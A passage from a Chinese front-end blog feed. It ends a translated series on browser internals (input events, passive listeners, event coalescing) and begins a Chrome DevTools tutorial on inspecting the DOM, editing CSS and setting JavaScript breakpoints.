class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这样只需添加一个事件处理器，即可监听所有元素，的确十分省事。然而，如果站在浏览器的角度去考量，这等于把整个页面都标记成了“非立即可滚动区”，意味着即便你设计的应用本不必理会页面上一些区域的输入行为，合成线程也必须在每次输入事件产生后与主线程通信并等待返回。如此则得不偿失，使原本能保障页面滚动流畅的合成器没了用武之地。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617652730-c7bc2e88-1e9d-4752-a4a0-88268a4c3729.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617652730-c7bc2e88-1e9d-4752-a4a0-88268a4c3729.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 4：非立即可滚动区覆盖整个页面下的输入描述示意图</p><p>你可以给事件监听添加一个 <code>[passive:true](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener#Improving_scrolling_performance_with_passive_listeners)</code> 选项 ，将这种负面效果最小化。这会提示浏览器你想继续在主线程中监听事件，但合成器不必停滞等候，可接着创建新的合成帧。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">document.body.addEventListener(&#x27;touchstart&#x27;, event =&gt; &#123;</span><br><span class="line">    if (event.target === area) &#123;</span><br><span class="line">        event.preventDefault()</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;, &#123;passive: true&#125;);</span><br></pre></td></tr></table></figure><p><a name="8309d096"></a></p><h2 id="检查事件是否可撤销"><a href="#检查事件是否可撤销" class="headerlink" title="检查事件是否可撤销"></a>检查事件是否可撤销</h2><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617659981-dab98eae-dba4-4e00-ac04-1b94e4aabf75.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617659981-dab98eae-dba4-4e00-ac04-1b94e4aabf75.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 5：部分区域仅可水平方向滚动的网页</p><p>设想一下这种情形：页面上有一个盒子，你要将其滚动方向限制为水平滚动。</p><p>为目标事件设置 <code>passive:true</code> 选项可让页面滚动平滑，但在你使用 <code>preventDefault</code> 以限制滚动方向时，垂直方向滚动可能已经触发。使用 <code>event.cancelable</code> 方法可以检查并阻止这种情况发生。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">document.body.addEventListener(&#x27;pointermove&#x27;, event =&gt; &#123;</span><br><span class="line">    if (event.cancelable) &#123;</span><br><span class="line">        event.preventDefault(); // 阻止默认的滚动行为</span><br><span class="line">        /*</span><br><span class="line">        *  这里设置程序执行任务</span><br><span class="line">        */</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, &#123;passive:: true&#125;);</span><br></pre></td></tr></table></figure><p>或者，你也可以应用 <code>touch-action</code> 这类 CSS 规则，完全地将事件处理器屏蔽掉。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#area &#123;</span><br><span class="line">  touch-action: pan-x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="063d68e2"></a></p><h2 id="定位事件目标"><a href="#定位事件目标" class="headerlink" title="定位事件目标"></a>定位事件目标</h2><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617668976-70fe0d91-6607-4a0a-a71d-bb2231465a3d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617668976-70fe0d91-6607-4a0a-a71d-bb2231465a3d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 6：主线程检查绘制记录查询坐标 x、y 处绘制内容</p><p>合成器将输入事件发送至主线程后，首先运行的是命中检测。命中检测会使用渲染进程中产生的绘制记录数据，找出事件发生坐标下的内容。</p><p><a name="d791b565"></a></p><h2 id="降低往主线程发送事件的频率"><a href="#降低往主线程发送事件的频率" class="headerlink" title="降低往主线程发送事件的频率"></a>降低往主线程发送事件的频率</h2><p>之前的文章里，我们探讨了常见显示屏如何以每秒 60 帧的频率刷新，以及我们要怎样与其刷新频率保持步调一致，以营造出流畅的动画效果。而对于用户的输入行为，常见触摸屏设备的事件传输频率为每秒 60~120 次，常见鼠标设备的事件传输频率为每秒 100 次。可见，输入事件有着比显示屏幕更高的保真度。</p><p>如果一连串 <code>touchmove</code> 这样的事件以每秒 120 次的频率发送往主线程，那么可能会触发过量的命中检测及 JavaScript 脚本执行。相形而言，我们的屏幕刷新率则更为低下。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617676154-ac76c52a-fb38-42e3-baea-718f9fb25b52.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617676154-ac76c52a-fb38-42e3-baea-718f9fb25b52.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 7：大量事件涌入合成帧时间轴会造成页面闪烁</p><p>为了降低往主线程中传递过量调用，Chrome 会合并这些连续事件（如：<code>wheel</code>, <code>mousewheel</code>, <code>mousemove</code>, <code>pointermove</code>, <code>touchmove</code> 等），并将其延迟至下一次 <code>requestAnimationFrame</code> 前发送。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617682519-c93cb336-12a1-4698-bdd4-082700a99498.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617682519-c93cb336-12a1-4698-bdd4-082700a99498.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 8：相同的时间轴下事件被合并且延迟发送</p><p>所有独立的事件，如: <code>keydown</code>, <code>keyup</code>, <code>mouseup</code>, <code>mousedown</code>, <code>touchstart</code>, 及  <code>touchend</code> 则会立即发往主线程。</p><p><a name="0cc9abc4"></a></p><h2 id="使用-getCoalescedEvents-获取帧内事件"><a href="#使用-getCoalescedEvents-获取帧内事件" class="headerlink" title="使用 getCoalescedEvents 获取帧内事件"></a>使用 <code>getCoalescedEvents</code> 获取帧内事件</h2><p>事件合并可帮助大多数 web 应用构建良好的用户体验。然而，如果你开发的是一个绘图类应用，需要基于 <code>touchmove</code> 事件的坐标绘制线路，那么在你试图画下一根光滑的线条时，区间内的一些坐标点也可能会因事件合并而丢失。这时，你可以使用目标事件的  <code>getCoalescedEvents</code> 方法获取事件合并后的信息。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617699750-626e95d0-1729-4d8f-8025-b26d06e648aa.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617699750-626e95d0-1729-4d8f-8025-b26d06e648aa.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 9：左为流畅的触摸手势路径、右为事件合并后的有限路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&#x27;pointermove&#x27;, event =&gt; &#123;</span><br><span class="line">    const events = event.getCoalescedEvents();</span><br><span class="line">    for (let event of events) &#123;</span><br><span class="line">        const x = event.pageX;</span><br><span class="line">        const y = event.pageY;</span><br><span class="line">        // 使用 x、y 坐标画线</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a name="fc0952b5"></a></p><h2 id="后续步骤"><a href="#后续步骤" class="headerlink" title="后续步骤"></a>后续步骤</h2><p>本系列文章里，我们探讨了很多关于 web 浏览器内部的工作原理。如果之前你从来没想过：为什么 Devtools 推荐在事件处理器上添加 <code>&#123;passive:true&#125;</code> 选项、为什么有时须在 script 标签里添加 <code>async</code> 属性？那么我希望这一系列文章能帮助你了解，为什么传递这些信息给浏览器能让其提供更为迅捷流畅的 web 体验。</p><p><a name="f5a9afa0"></a></p><h3 id="使用-Lighthouse"><a href="#使用-Lighthouse" class="headerlink" title="使用 Lighthouse"></a>使用 Lighthouse</h3><p>如果你想构建出对浏览器更为友好的代码，却一直毫无头绪，那么不妨先从使用 <a href="https://developers.google.com/web/tools/lighthouse/">Lighthouse</a> 开始。Lighthouse 是个可以帮助你审查网站工具，并且能提供页面性能报告。性能报告会告诉你什么地方处理得当，什么地方有待提升。浏览审查列表也能让你了解浏览器着力关注的重点所在。</p><p><a name="ffa7e0b9"></a></p><h3 id="学习如何评测性能"><a href="#学习如何评测性能" class="headerlink" title="学习如何评测性能"></a>学习如何评测性能</h3><p>对于不同的站点，桎梏其性能之处可能不尽相同，所以专门为你自己的站点定制化一套性能评测方案，并择优选取技术应用，是重中之重。Chrome 的 Devtools 团队就 <a href="https://developers.google.com/web/tools/chrome-devtools/speed/get-started">如何测试你的站点性能</a> 撰有相关教程可供参阅。</p><p><a name="fcb2f19e"></a></p><h3 id="为你的站点添加-Feature-Policy"><a href="#为你的站点添加-Feature-Policy" class="headerlink" title="为你的站点添加 Feature Policy"></a>为你的站点添加 Feature Policy</h3><p>如果你想进一步采用更多方案，<a href="https://developers.google.com/web/updates/2018/06/feature-policy">Feature Policy</a> 是一个新的 web 平台，可在开发时为你保驾护航。开启 feature policy 可以限制应用行为，并使你远离诸多技术弊端。举个例子，如果你想确保应用不会阻塞解析，那么可以采用同步脚本方案运行应用。开启 <code>sync-script:&#39;none&#39;</code> 后，导致解析阻塞的 JavaScript 脚本会被阻止运行。这就确保了你的代码不会阻塞解析，浏览器也无须考虑暂停运行解析器。</p><p><a name="Rz4Sx"></a></p><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617711586-2fa803a0-4b32-4415-89b4-2343084793e4.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617711586-2fa803a0-4b32-4415-89b4-2343084793e4.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>刚踏上开发之路时，我几乎只关注怎样去写代码、怎样提升自己的生产效率。诚然，这些事情很重要，但与此同时我们也应当思考浏览器会怎么去处理我们书写的代码。现代浏览器一直致力探索如何提供更好的用户体验。书写对浏览器友好的代码，反过来也能提供友好的用户体验。路漫漫其修远兮，希望我们能携手共进，构建出对浏览器更为友好的代码。</p><p><a name="8JBIM"></a></p><h1 id="文章出处"><a href="#文章出处" class="headerlink" title="文章出处"></a>文章出处</h1><blockquote><ul><li>原文地址 1：<a href="https://developers.google.com/web/updates/2018/09/inside-browser-part1">Inside look at modern web browser (part 1)</a></li><li>原文地址 2：<a href="https://developers.google.com/web/updates/2018/09/inside-browser-part2">Inside look at modern web browser (part 2)</a></li><li>原文地址 3：<a href="https://developers.google.com/web/updates/2018/09/inside-browser-part3">Inside look at modern web browser (part 3)</a></li><li>原文地址 4：<a href="https://developers.google.com/web/updates/2018/09/inside-browser-part4">Inside look at modern web browser (part 4)</a></li><li>原文作者：<a href="https://developers.google.com/web/resources/contributors/kosamari">Mariko Kosaka</a></li><li>译文出自：<a href="https://github.com/xitu/gold-miner">掘金翻译计划</a></li><li>本文永久链接 1：<a href="https://github.com/xitu/gold-miner/blob/master/TODO1/inside-look-at-modern-web-browser-part1.md">https://github.com/xitu/gold-miner/blob/master/TODO1/inside-look-at-modern-web-browser-part1.md</a> （译者：<a href="https://github.com/Colafornia">Colafornia</a>，校对者：<a href="https://github.com/CoderMing">CoderMing</a> <a href="https://github.com/sakila1012">sakila1012</a>，2020.07.18）</li><li>本文永久链接 2：<a href="https://github.com/xitu/gold-miner/blob/master/TODO1/inside-browser-part2.md">https://github.com/xitu/gold-miner/blob/master/TODO1/inside-browser-part2.md</a> （译者：<a href="https://github.com/CoolRice">CoolRice</a>，校对者：<a href="https://github.com/ThomasWhyne">ThomasWhyne</a>, <a href="https://github.com/tian-li">tian-li</a>）</li><li>本文永久链接 3：<a href="https://github.com/xitu/gold-miner/blob/master/TODO1/inside-browser-part3.md">https://github.com/xitu/gold-miner/blob/master/TODO1/inside-browser-part3.md</a> （译者：<a href="https://github.com/ssshooter">ssshooter</a>，校对者：<a href="https://github.com/ThomasWhyne">ThomasWhyne</a>, <a href="https://github.com/CoolRice">CoolRice</a>）</li><li>本文永久链接 4：<a href="https://github.com/xitu/gold-miner/blob/master/TODO1/inside-browser-part4.md">https://github.com/xitu/gold-miner/blob/master/TODO1/inside-browser-part4.md</a>（译者：<a href="https://github.com/ThomasWhyne">ThomasWhyne</a>，校对者：<a href="https://github.com/llp0574">llp0574</a> <a href="https://github.com/CoolRice">CoolRice</a>，2020.07.11）</li></ul></blockquote><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> 浏览器 </tag>
            
            <tag> 原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chrome调试技巧</title>
      <link href="/2020/11/11/frontend/browser/debug/chrome-diao-shi-ji-qiao/"/>
      <url>/2020/11/11/frontend/browser/debug/chrome-diao-shi-ji-qiao/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="54bcvn"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在前端开发过程中，我们通过浏览器的页面来查看我们代码编写的成果。然而浏览器的功能非常强大，它不只是能展示我们编写的页面，还能够帮助我们定位开发过程中遇到的问题，提升我们的开发效率。有些时候我们甚至还可以通过浏览器的调试工具来查看一些网站酷炫效果的实现方式。下面我们以 Chrome 浏览器为例，来介绍一些常用的调试技巧。</p><p><a name="l229zq"></a></p><h3 id="1-Chrome-开发者工具"><a href="#1-Chrome-开发者工具" class="headerlink" title="1. Chrome 开发者工具"></a>1. Chrome 开发者工具</h3><p>首先我们打开 Chrome 的开发者工具（又称控制台），打开方式有以下几种：</p><ol><li>点击浏览器右上角竖排的“三个点”，选择“更多工具”，再选择“开发者工具”打开</li><li>单机鼠标右键，点击“查看”选项打开</li><li>通过按快捷键 Ctrl + shift + I 快速打开</li></ol><p>通过以上任意一种方式打开开发者工具后，我们能够看到这样的界面。</p><p>开发者工具界面</p><p>开发者工具界面的信息量比较大，不过不用担心，我们一点点来看。工具栏上前几个 tab 是我们最常用的调试模块。</p><ul><li>Element 用于查看和编辑 DOM 节点和节点相对应的 CSS 样式。</li><li>Console 用于打印运行时抛出的信息，我们可以通过它查看异常信息或主动抛出信息进行调试。</li><li>Sources 用于查看资源信息，我们编写和运行的代码都可以在这里找到。我们可以通过在这里设置断点来达到调试的目的。</li><li>Network 用于查看请求信息，这里可以看到所有的页面资源请求，包括网络请求、图片资源、HTML、CSS、JS 等。可以根据需求筛选请求项，一般多用于网络请求的查看和分析。</li><li>Performance 用于查看页面加载的性能情况，包括页面渲染时间、JS 执行时间等</li><li>Application 用于查看 cookie、localStorage 等信息</li></ul><p>以上是 Chrome 开发者工具的主要功能模块，虽然内容略多，但是正因为有了这些信息，浏览器的调试功能才会如此强大。现在记不住这些模块也没关系，接下来我们将通过使用这些调试工具，来加深对它们的理解，并看看它们能为我们的开发带来怎样的帮助。</p><p><a name="i8b1dy"></a></p><h3 id="2-DOM-调试"><a href="#2-DOM-调试" class="headerlink" title="2. DOM 调试"></a>2. DOM 调试</h3><p><a name="3wv6ln"></a></p><h4 id="2-1-查看-DOM"><a href="#2-1-查看-DOM" class="headerlink" title="2.1 查看 DOM"></a>2.1 查看 DOM</h4><p>在浏览器中，如果我们想要了解一个页面的 DOM 结构，我们可以通过开发者工具中的 Element 模块进行查看。我们首先编写一段 HTML</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM调试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个表格<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>第一列<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>第二列<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>第三列<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">td</span>&gt;</span>3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">td</span>&gt;</span>11<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">td</span>&gt;</span>22<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">td</span>&gt;</span>33<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>保存这段 HTML 后在浏览器打开，并开启控制台。我们将工具栏选中到 Element ，会看到这样的信息</p><p>查看 DOM 元素</p><p>你会发现这里展示的 DOM 结构就是我们写的 HTML ，浏览器不仅将我们的 HTML 渲染成页面，还将它的 DOM 显示在控制台中方便我们调试。</p><p>用鼠标在控制台里选中不同的 DOM 节点，会发现页面中有蓝色区块会随着鼠标选中 DOM 节点的变化而调整，实际上 <strong>蓝色区块就是当前 DOM 节点对应渲染的页面部分</strong> 。</p><p><a name="xqf4th"></a></p><h4 id="2-2-定位-DOM"><a href="#2-2-定位-DOM" class="headerlink" title="2.2 定位 DOM"></a>2.2 定位 DOM</h4><p>当一个页面结构比较复杂，层级较深的时候，我们通过移动鼠标在 DOM 节点中寻找需要查看的节点就会变得比较麻烦。要点开它的外层节点并一级一级找下去，这样的查找方式费时费力，因此浏览器控制台提供了一个方便定位 DOM 的功能。</p><p>依然是上面那个例子，如果我们需要去找到 table 中的第一行第二列的那个单元格，怎样操作比较迅速？这里我们通过点击控制台左上角的一个定位按钮来进行快速选中。打开控制台，点击定位按钮，点击后该按钮会变成蓝色，标志我们当前正处于定位模式（定位模式下鼠标无法触发页面交互，如按钮事件等）。</p><p>定位按钮</p><p>接下来我们在页面上点击我们想要查看的元素，点击页面上 table 中第一行第二列的单元格（显示 2 的那个）。点击后我们发现控制台的 Element 直接将那个 <td> 节点高亮定位了。</p><p>高亮定位</p><p>这样我们就迅速的定位了我们想要查看的 DOM 节点，此时定位按钮从蓝色变为灰色，标志着定位完成，退出定位模式。快速定位的功能在复杂结构的页面中尤为实用，我们可以在开发过程中充分利用起来。</p><p><a name="40cwdw"></a></p><h4 id="2-3-操作-DOM"><a href="#2-3-操作-DOM" class="headerlink" title="2.3 操作 DOM"></a>2.3 操作 DOM</h4><p>完成了 DOM 的定位，接下来我们可以对 DOM 元素做一些操作。对当前选中的 DOM 元素点击右键可以看到一系列的操作选项。</p><p>DOM 操作选项</p><p>点击 Edit as HTML 来对当前的 DOM 节点做改写和添加，例如这里我们对 <p> 标签做编辑，在后面添加另一个 <p> 标签。</p><p>编辑 p 标签</p><p>完成后点击旁边未被选中到元素即可保存编辑，并在浏览器页面上同步生效。此时可以发现页面上已经出现了我们刚刚添加的节点了。</p><p>编辑后生效</p><p>如果你想撤销上一次 DOM 变更，按 ctrl + Z 即可，重做则按 ctrl + shift + Z。</p><p>其他的一些 DOM 操作也都很直观，比如可以点击 Add attribute 给选中节点添加属性；Delete element 会删除选中节点等等。操作很简单，这里就不一一演示，读者可以自己尝试一下。</p><p><a name="otkqal"></a></p><h3 id="3-CSS-调试"><a href="#3-CSS-调试" class="headerlink" title="3. CSS 调试"></a>3. CSS 调试</h3><p>除了对 DOM 的操作，我们还能够方便得对 CSS 进行调试。不知大家在查看 DOM 的时候有没有关注到界面上还有这么一块区域？</p><p>CSS 调试区域</p><p>这里就是 CSS 的地盘。我们可以在这里看到选中的 DOM 节点上已添加的样式，可以对里面对值进行修改，或是添加其他 CSS 样式。这里我们给 <p> 标签添加一个 color 样式。</p><p>添加文字颜色样式</p><p>先用 DOM 调试的技巧选中这段文字，再对它添加完 color:red ，这时我们发现页面上的文字变成了红色，与此同时控制台对 DOM 节点树中也对这个节点动态得添加了一个 style 属性，于是我们完成了样式添加。这就是浏览器调试 CSS 样式的便捷之处 —— 简单且直观。甚至于接下来如果我想改变一下文字的颜色，只需要在样式栏里点击一下 color 属性，就可以进行变更了，所见即所得。</p><p>改变文字颜色</p><p>我们再注意到样式栏的顶部，有一些 :hover 的图标，点开来看，发现这里可以设置 DOM 的交互状态。假设勾选一个 :focus 复选框，当前选中的 DOM 节点便被模拟了获取焦点的样式特性。</p><p>模拟 DOM 交互状态</p><p>最后我们再看一下右侧部分，上面有个矩形，它就是我们在 CSS 部分中学习过的“盒子模型”。通过将鼠标在盒子模型上移动，页面上会显示出相对应的 DOM 节点，通过它我们能够更好得了解页面上的布局结构。选中 Computed ，下方显示出一系列的样式，这些样式就是节点经过浏览器计算后渲染在页面上的最终样式，如果某一个节点受到多个地方的样式影响，我们就可以在这里看到它最终的样式属性（与页面上的渲染效果相对应）。</p><p>盒子模型与最终样式</p><p><a name="yu8prs"></a></p><h3 id="4-JS-调试"><a href="#4-JS-调试" class="headerlink" title="4. JS 调试"></a>4. JS 调试</h3><p>本节内容将简单介绍如何使用浏览器对 JS 进行调试，由于很多时候我们所说的浏览器调试都是指 JS 调试，因此这部分有很多调试的方法和技巧。具体的调试技巧将在下一章节详细介绍，本节只做一个熟悉的过程。</p><p>JS 的调试主要关注的区域是 Console 和 Sources 模块，前文说过 Console 模块是用于打印运行时抛出的信息，我们可以通过它查看异常信息或主动抛出信息进行调试。 Sources 用于查看资源信息，我们编写和运行的代码都可以在这里找到。我们可以通过在这里设置断点来达到调试的目的。那么接下来我们分别对这两个模块加以认识。</p><p>首先点击进入 Console 模块，会看到一个可输入的控制台界面。在这里我们可以输入一些简单的 JS 指令，按回车键执行。</p><p>Console 控制台</p><p>通过简单的尝试可以看到，在这里我们可以能够执行 JS 脚本，并且直观得看到输出结果。这意味着当我们希望看到 JS 代码运行时的数据状态时，我们可以利用这个工具来给我们展现。那么如何在 JS 中使用 Console 控制台呢？其实很简单，只要在你希望查看的数据处加上一行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(希望查看的数据);</span><br></pre></td></tr></table></figure><p>即可在 Console 控制台中查看数据。有了它我们不需要等到 JS 代码执行完毕才能看是否符合预期，在执行过程中我们就可以很方便得查看动态数据并打印记录在控制台中，这对我们的编程有很大的帮助。</p><p>接下来我们来看 Sources 模块。我们可以任意访问一个在线网站，然后打开控制台，点击  Sources 会看到一些代码。这些代码就是当前这个页面所引用的资源，包括 JS 文件，样式文件等等，由于线上运行的代码通常是经过混淆和压缩的,可能难以定位和阅读。我们在文件底部可以看到一个花括号 {} ,点击这个花括号我们能将压缩了的文件格式化成正常的语法缩进。</p><p>Sources 界面</p><p>我们注意到代码的左侧是一列数字，标记着当前的代码处于第几行。这列数字是可以点击的，当点击某个数后，数字被标记成蓝色，此时标记着我们在这一行代码处设置了断点，当程序运行到这段代码处时会停止运行并保留运行现场。我们可以查看当下运行时的数据和方法的执行情况，实际上这就是我们所谓的“断点调试”，下一章节会详细演示。</p><p>这里我们关注到当程序运行到断点处时，页面上会出现一个条形的操作栏显示 paused in debugger ，右边紧跟着两个按钮。第一个三角形的按钮表示 “跳过断点” ，点击它之后脚本会继续往下执行，直到完成运行或是进入到下一个设置的断点。另一个弧形的按钮表示 “单步调试” ，代码会进入到断点的下一行，我们可以查看下一行代码的运行情况。由于此时仍然是断点状态我们可以重复点击 “单步调试” 的按钮达到逐步运行的调试效果。</p><p>断点调试操作界面</p><p>最后再介绍一些 Sources 模块下实用的快捷键，选中控制台的 Sources 之后按下 ctrl + P ，能够搜索当前页面引用的资源。通过它我们可以迅速找到希望调试的 JS 文件。当我们选中某个文件之后，可以使用快捷键 ctrl + F 进行文件内容检索，方便快速定位代码片段和查看变量使用。</p><p>常用快捷键操作</p><p><a name="q2h3lz"></a></p><h3 